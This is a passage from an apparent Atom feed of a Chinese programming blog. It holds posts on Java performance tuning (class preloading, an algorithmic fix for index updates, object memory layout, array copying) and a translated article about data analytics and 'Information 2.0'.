类以编程的方式编译方法可以减轻这一问题，但是维护这样的方法非常乏味并且容易发生错误。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 22px; font-family: verdana;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;line-height: 22px; font-family: verdana;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;一旦找到的问题的原因，那么解决问题的方法很简单，可以在某个合适的空闲的时候，提前进行类加载和编译，那么当第一次进行一些实时操作时，所要用到的类已经加载或者相关代码已经编译，第一次操作便不再慢了。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Java性能优化之实战算法[2]</title>
   <link href="http://hackfisher.github.com/blog/2009/05/java-performance-2"/>
   <updated>2009-05-10T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/05/java-performance-2</id>
   <content type="html">&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;——当你拿着一把锤子的时候，所有的东西看起来都像钉子。&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;——当你看到钉子的时候，手上拿着的东西看起来就像一把锤子。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'Trebuchet MS'; font-weight: bold; line-height: 22px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;&lt;a href=&quot;http://yangtsefisher.blogspot.com/2009/05/test-code.html&quot;&gt;Java性能优化之实战漫谈[1]&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;性能优化有时候很像玩一个策略游戏(免费)，对手不是计算机，程序员，设计架构，编译器，控制流，而是时间，内存，竞争条件，预算限制等等。有三个资源限制几乎所有应用都会面临：1.CPU速度和有效性2.系统内存3.磁盘I/O。
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;性能分析的关键是找到瓶颈所在，符合&lt;/span&gt;&lt;a href=&quot;http://program-think.blogspot.com/2009/02/80-20-principle-0-overview.html&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;二八原理&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;的是，计算机通常会将80%的时间花在20%的程序上，所以找出这20%的瓶颈很重要，这就是我&lt;/span&gt;&lt;a href=&quot;http://yangtsefisher.blogspot.com/2009/05/test-code.html&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;上篇&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;中所说的，为什么在优化之前一定要分析，不要相当然。我从二八原理学到的就是要统筹分析，使做事效率最优化，这个优化跟我们标题中提到Java性能优化道理上都是一样的。即应该把80%的时间花在造成问题的80%原因上面。呵呵，绕口吧。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;比如，我在分析的时候，就发现了这么一个瓶颈，一个微不足道的步骤却消耗了大部分CPU资源，某些情况下CPU花了它96%的时间来处理它。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;简化模型，描述起来，就是：&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-style: italic;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;一维数组，每个元素都有保持它是第几个的一个index， 从头到尾插入元素，已有的元素的index需要做出调整，以保持一致性（即：array[i].index = i）。按照我们现在的算法，是每插入一条，其后面的每个元素记录的索引都要做出相应调整。简单估计一下，假设输入规模是N，大概需要O(N^2)的时间，当只有两三万的时候还好，大到8万就显得慢了(是两万时的16倍)。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-style: italic;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;这个问题本质上是个算法问题，就是怎么样把&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-style: italic;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;O(N^2)&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;降到&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-style: italic;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;O(N)&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;或者更低的问题，这样便可以大大的提高CPU效率和速度。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;开始之前，我想了两种方法：&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;方法一：绕过这个问题，想办法直接计算出某元素在插入后的值，或者等到多次插入后，一起调整。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;方法二：直接解决这个问题，不用字段index保存这个问题，想办法借助类似C++的指针地址，和数组地址来计算index。
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;对于方法二，需要借助语言特性，因为Java是没有办法取到对象值实例的地址，估计C++也悬，这条途径的复杂度和陷阱太多了，所以很快被抛弃了。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;思考方法一：其实对于插入记录整个这个过程，许多记录被调整了多次，其实中间的这些调整是不用关心的，我们只需要知道最后状态是在某个位置就行了。因此，我们想要直接计算插入后的位置，让每条记录只进行一次索引调整。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;最后的解决办法就是，首先将插入的记录排序，即从前往后插入，然后要做到取消中间的这些调整，使每条记录只调整一次，对于每个记录来说，只要用一个临时变量来记录它的前面已经插入的多少条记录，从前往后调整，轮到某条记录时，便可以计算出位置索引index的值，保证初始状态和插入结束后状态的一致性。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;这个问题看起来是不是似乎很简单？但是，实际情况中的问题要复杂的多，比如，有可能这个插入是在某个大的循环中进行的，也可能在插入的同时，程序需要对这个数组中的记录做操作，可能还是个二维数组等等。关键的是，你需要做出某些努力，重构简化模型，然后抽象出模型，找出问题的本质。&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;原来的做法，每插入一次就调整一次为的是保证插入过程中每个记录状态都要保持一致性，这个要求太高了，所以导致了O(N^2)的高代价。真正的要求没有那么高，我们只需要开始和结束两个状态的一致性就行了，而这只需要N(O)就可以做到，这个代价就低了。这样这个瓶颈就通过算法来解决了，可以看出算法在性能优化中还是很重要的。&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'Trebuchet MS'; font-weight: bold; line-height: 22px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;&lt;a href=&quot;http://yangtsefisher.blogspot.com/2009/05/java-performance-tuning-realtime-3.html&quot;&gt;Java性能优化之实时性[3]&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>Java性能优化之实战漫谈[1]</title>
   <link href="http://hackfisher.github.com/blog/2009/05/java-performence-1"/>
   <updated>2009-05-09T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/05/java-performence-1</id>
   <content type="html">&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;——I can feel the need, the need of speed...&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;——提前优化是万恶之源&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;最近由于工作的原因，对Java的性能优化比较关注，其间也看到不少比较好的文章系列，比如Program-Think同学的&lt;/span&gt;&lt;a href=&quot;http://program-think.blogspot.com/2009/03/java-performance-tuning-0-overview.html&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;Java性能优化系列&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;。平常工作的时候，&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;发现稍微有点好想法的时候，&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;&lt;wbr&gt;把自己独自一个人关在小屋子里集中精力思考，效果很不错，俗称“&lt;/wbr&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;&lt;wbr&gt;闭关”，大家也可以试一试。&lt;/wbr&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;谈到Java优化，我认为一切开始之前，最最重要的是找到一个合适的profile工具，这里有篇文章介绍的很详细：&lt;/span&gt;&lt;a href=&quot;http://java.dzone.com/news/how-fix-memory-leaks-java&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;How to Fix Memory Leaks in Java&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;，里面介绍了许多有用的profile工具，不用花太多时间，找到合适你自己的就行了，我用的是&lt;/span&gt;&lt;a href=&quot;http://www.ej-technologies.com/products/jprofiler/overview.html&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;jprofile&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;，感觉还不错。记住，重要的是，在每个优化开始之前，一定要用profile工具分析性能的问题出在哪边，千万不要想当然。&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse: collapse; font-family: arial;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;今天就先将两个简单的例子作为开头吧，大家轻松轻松。
例子一：&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;class A {&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;int a_num;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;B b;}&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;
&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;class B{&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;int b_num;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;A a;}&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;
&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;如果改成下面这样怎么样？&lt;/span&gt;
&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;class AB {&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;int a_num;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;int b_num;}&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;
&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;某些Java应用程序当对象太多而垃圾回收器还没有来得及回收的时候，就可能会导致堆内存溢出，其实内存溢出是分为栈内存溢出和堆内存溢出的，关于堆和栈的区别，可以参考program-think的&lt;/span&gt;&lt;a href=&quot;http://program-think.blogspot.com/2009/03/java-performance-tuning-1-two-types.html&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;这篇文章&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;,讲的通俗易懂。关于上面的这个例子，就是我在实际编码中发现的一个造成内存消耗严重的一个问题，你或许还会认为上面那种写法更技术，更××。如果A的实例和B的实例个数很少的时候还好，但是如果他们的实例个数达到上百万的级别的时候，你就会思考一下是不是要换成下面这种写法了。首先你要了解怎么去计算一个对象会占多少字节的内存，然后思考为什么下面的写法会比上面的占用更少的内存？&lt;/span&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;
&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;例子二：&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;如果你用Java写程序，那么你会怎么样把一个数组objct_array：Object[]加到一个list:java.util.List中去？&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;我并不清楚你是怎么写的，不过我却见过一种非常常用的写法：&lt;/span&gt;&lt;/div&gt;
&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;list.addAll(java.util.Arrays.asList(objct_array))&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;
&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;其实，如果不是在内核运算的地方，或者某个对性能要求很高的地方写这句话完全没有问题，但如果在某个关键的地方，比如在某个要调用极多次数的方法里写用这个方法，也许就会出现问题。在这种地方，最好还是不要偷懒，用最原始但很高效的数组来解决问题。&lt;/span&gt;
&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;Object[] old_array = array;array = new Object[old_array.length + new_array.length];System.arraycopy(old_array, 0, array, 0, old_array.length);System.arraycopy(new_array, 0, array, old_array.lengyh, new_array.length);&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;
&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;事实上：ce_list.addAll(java.util.Arrays.asList(ce_array));这句效率是非常慢的，它将&lt;/span&gt;&lt;/pre&gt;
&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;一个数组变成了一个list又变成一个数组又变成一个list，因为内部是这样实现的：&lt;/span&gt;&lt;/pre&gt;
&lt;pre escaped=&quot;true&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'courier new';&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;public static List asList(Object[] a) {return new ArrayList(a); // 新建了一个对象，同时数组变成一个list.}public boolean addAll(Collection c) {Object[] a = c.toArray(); // 看这里, list又变成了一个数组，绕了一圈啊int numNew = a.length;ensureCapacity(size + numNew); // Increments modCountSystem.arraycopy(a, 0, elementData, size, numNew); // 这个跟修改后做的差不多size += numNew;return numNew != 0;}&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;
&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;结果证明：修改后这部分消耗的临时内存没有了，速度也变快了。&lt;/span&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'Trebuchet MS'; font-weight: bold; line-height: 22px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;&lt;a href=&quot;http://yangtsefisher.blogspot.com/2009/05/java-performance-tuning-algorithm-2.html&quot;&gt;Java性能优化之实战算法[2]&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family: 'Trebuchet MS'; font-weight: bold; line-height: 22px;&quot;&gt;&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size: small;&quot;&gt;&lt;a href=&quot;http://yangtsefisher.blogspot.com/2009/05/java-performance-tuning-realtime-3.html&quot;&gt;Java性能优化之实时性[3]&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>信息2.0(译文)</title>
   <link href="http://hackfisher.github.com/blog/2009/04/info2_0-translation"/>
   <updated>2009-04-25T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2009/04/info2_0-translation</id>
   <content type="html">&lt;p class=&quot;inner&quot; style=&quot;padding: 0px; margin: 5px;&quot;&gt;这篇文章的作者是印度一家公司www.InRev.org的市场总监，这是一家十分年轻的公司，刚刚成立不久，致力于数据分析。就像它的名字InRev一样，他们野心勃勃的想要参与到信息革命中的浪潮来，并在其中充当至关重要的弄潮儿。
在作者的另外一篇博客&lt;a href=&quot;http://engineeringanalytics.blogspot.com/2009/04/analytics-industry.html&quot;&gt;Analytics Industry(分析工业)&lt;/a&gt;中曾指出在中国这样数据分析公司几乎没有，而国外这些公司已经小有规模，中国如果想要赶上信息革命的浪潮，也许应该具备更长远的眼光。&lt;/p&gt;
&lt;p class=&quot;inner&quot; style=&quot;font-family: Verdana, arial, sans-serif; padding: 0px; margin: 5px;&quot;&gt;这篇文章主要指出了市场对于智能处理数据的需求，介绍了Web上现有的一些处理工具和报表工具，指出信息2.0的时代已经到来——&lt;/p&gt;
&lt;p class=&quot;inner&quot; style=&quot;font-family: Verdana, arial, sans-serif; padding: 0px; margin: 5px;&quot;&gt;----------------------------------------&lt;/p&gt;
&lt;p class=&quot;inner&quot; style=&quot;font-family: Verdana, arial, sans-serif; padding: 0px; margin: 5px;&quot;&gt;----------------------------------------&lt;/p&gt;
&lt;p class=&quot;inner&quot; style=&quot;font-family: Verdana, arial, sans-serif; padding: 0px; margin: 5px;&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; font-family: Verdana, arial, sans-serif; padding: 0px;&quot;&gt;&lt;span style=&quot;font-family: Verdana, arial, sans-serif; font-size: large; padding: 0px; margin: 0px;&quot;&gt;&lt;strong style=&quot;font-family: Verdana, arial, sans-serif; padding: 0px; margin: 0px;&quot;&gt;信息2.0&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; font-family: Verdana, arial, sans-serif; padding: 0px;&quot;&gt;&lt;span style=&quot;font-family: Verdana, arial, sans-serif; font-size: small; padding: 0px; margin: 0px;&quot;&gt;作者：Deep Sherchan&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; font-family: Verdana, arial, sans-serif; padding: 0px;&quot;&gt;&lt;span style=&quot;font-family: Verdana, arial, sans-serif; font-size: small; padding: 0px; margin: 0px;&quot;&gt;译者：YantseFisher&lt;/span&gt;&lt;/p&gt;
&lt;p style=&quot;margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; font-family: Verdana, arial, sans-serif; padding: 0px;&quot;&gt;&lt;span style=&quot;font-family: Verdana, arial, sans-serif; font-size: small; padding: 0px; margin: 0px;&quot;&gt;原文地址：&lt;/span&gt;&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; href=&quot;http://engineeringanalytics.blogspot.com/2008/11/information-20.html&quot;&gt;&lt;span style=&quot;font-family: Verdana, arial, sans-serif; font-size: small; padding: 0px; margin: 0px;&quot;&gt;http://engineeringanalytics.blogspot.com/2008/11/information-20.html&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;发表日期 2008年11月21日，星期五&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;毫无疑问，这是信息的时代。但是，随着数据量的增长和大量冗余的出现，我们很容易就会迷失在这些海量的数据中。你是否记得你有多少次坐在电脑前为了去查找某个具体知识的相关内容，发现自己毫无目的的漫游了几个小时，忘记了你原来的意图。经常这样，不是吗？&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;Google通过提供高效率的搜索引擎，使得我们查找这些信息数据变得容易多了。不知怎么的，我们所有的人都开始变得懒惰起来，甚至不愿意去记住那些网站的名字，因为我们都很相信搜索引擎。那么信息革命的下一步是什么？分析？&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;好吧，我并不是要吹嘘我的专业背景，但是当信息量太大的时候，你当然需要某个东西去分析它们，还有...还有什么？还有就是要把他们报告给最终用户。&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;最终，我们需要的是定义明确，解释清楚的信息。所以，你不难在这里或者那里发现很多报表工具。但是，你能够经常找到一个网络报表入口，并且它是基于&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;Open Source SoftWare&quot; href=&quot;http://en.wikipedia.org/wiki/Open_source_software&quot; target=&quot;_blank&quot;&gt;开源软件&lt;/a&gt;的哲学吗？我曾遇到过的这样一个工具是&lt;a style=&quot;font-family: Verdana, arial, sans-serif; color: #2e6ab1; text-decoration: underline; padding: 0px; margin: 0px;&quot; title=&quot;OpenI&quot; href=&quot;http://www.openi.org/&quot; target=&quot;_blank&quot;&gt;OpenI&lt;/a&gt;.&lt;/p&gt;
&lt;p style=&quot;font-family: Verdana, arial, sans-serif; margin-top: 5px; margin-right: 0px; margin-bottom: 5px; margin-left: 0px; padding: 0px;&quot;&gt;&lt;/p&gt;
